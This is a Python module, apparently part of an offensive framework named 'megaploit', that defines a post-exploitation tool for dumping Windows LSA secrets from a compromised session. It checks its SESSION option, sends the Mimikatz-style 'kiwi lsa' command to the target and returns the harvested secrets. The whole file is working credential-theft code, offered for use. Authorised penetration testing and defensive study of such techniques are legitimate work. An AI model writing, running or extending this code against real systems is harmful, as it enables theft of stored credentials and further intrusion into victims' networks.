"""megaploit.modules.post.windows.gather.lsa_secrets — dump LSA secrets."""
from megaploit.modules.base import AgentModule, ModuleType, OptionType

class PostLsaSecrets(AgentModule):
    name        = "post/windows/gather/lsa_secrets"
    description = "Dump Windows LSA secrets via registry (SECURITY hive — needs SYSTEM)"
    module_type = ModuleType.POST
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1003/004/",
    ]
    platform    = ["windows"]; arch = ["x64", "x86"]; rank = 300

    def _define_options(self) -> None:
        self._opt("SESSION", OptionType.INTEGER, required=True,
                  description="Session ID to target")

    def run(self, session=None) -> list:
        self.validate()
        sess = session or self.session
        if sess is None:
            from megaploit.modules.base import ModuleError
            raise ModuleError("No session — set SESSION <id>")
        self.results.clear()
        self._emit("[*] Dumping LSA secrets via kiwi lsa…")
        out = self._send("kiwi lsa", sess)
        if out.strip() and "error" not in out.lower()[:100]:
            self._ok("LSA secrets retrieved", output=out)
        elif out.strip():
            self._fail(f"kiwi lsa: {out[:200]}")
        else:
            self._fail("No output from kiwi lsa")
        return self.results

MODULE = PostLsaSecrets
